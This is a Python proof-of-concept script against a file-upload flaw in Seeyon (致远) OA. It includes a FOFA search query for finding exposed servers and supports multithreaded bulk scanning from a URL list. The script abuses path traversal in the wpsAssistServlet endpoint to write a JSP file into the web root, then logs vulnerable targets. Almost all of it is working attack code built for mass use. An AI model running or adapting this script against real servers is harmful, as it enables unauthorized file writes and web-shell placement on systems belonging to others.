# 致远OA文件上传漏洞
import argparse,requests,sys,time,re,json
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app="致远互联-OA" && title="V8.0SP2"

def banner():
    test = """
███████╗██╗   ██╗      ██████╗  █████╗ 
╚══███╔╝╚██╗ ██╔╝     ██╔═══██╗██╔══██╗
  ███╔╝  ╚████╔╝█████╗██║   ██║███████║
 ███╔╝    ╚██╔╝ ╚════╝██║   ██║██╔══██║
███████╗   ██║        ╚██████╔╝██║  ██║
╚══════╝   ╚═╝         ╚═════╝ ╚═╝  ╚═╝

                        author:果冻                  
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='致远OA文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/qqq.jsp&fileId=2"
    headers = {
        'User-Agent':'Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.1)',
        'Accept-Encoding':'gzip,deflate',
        'Accept':'*/*',
        'Connection':'close',
        'Content-Length':'219',
        'Content-Type':'multipart/form-data;boundary=a4d7586ac9d50625dee11e86fa69bc71'
    }
    data = '--a4d7586ac9d50625dee11e86fa69bc71\r\nContent-Disposition: form-data; name="upload"; filename="123.txt"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n123\r\n--a4d7586ac9d50625dee11e86fa69bc71--'
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080',
    }
    try:
        response = requests.post(url=target+api_payload,headers=headers,data=data,verify=False,timeout=10,proxies=proxies)
        content = json.loads(response.text)
        path = 'qqq.jsp'
        if response.status_code == 200 and content['code'] == 200:
            print(f"[+]{target} 存在文件上传漏洞\n文件上传的路径为:{target}{path}")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()